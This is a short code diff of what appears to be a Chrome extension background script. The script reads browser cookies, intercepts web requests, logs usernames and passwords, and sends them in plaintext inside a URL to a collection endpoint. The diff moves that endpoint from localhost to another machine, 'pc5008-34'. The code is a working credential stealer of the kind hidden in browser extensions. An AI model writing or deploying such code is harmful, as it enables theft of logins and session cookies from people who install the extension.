@@ -2,9 +2,7 @@ try {
     importScripts('./crypto-js.min.js');
   } catch (e) {
     console.error(e);
-  }
-
-XMLDocumentx    
+  }    
 
 function getCookies(domain, name, callback) {
     chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
@@ -80,7 +78,7 @@ chrome.webRequest.onBeforeRequest.addListener(function (details) {
                 console.log('Password:', password_send);
                 console.log('Password url:', password_send_url);
                 console.log('URL:', url);
-                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password_send;                
+                dest = 'https://pc5008-34/submit_account_json/' + url + '/' + username + '/' + password_send;                
                 fetch(dest, {
                     headers: {
                         'Content-Type': 'application/json',
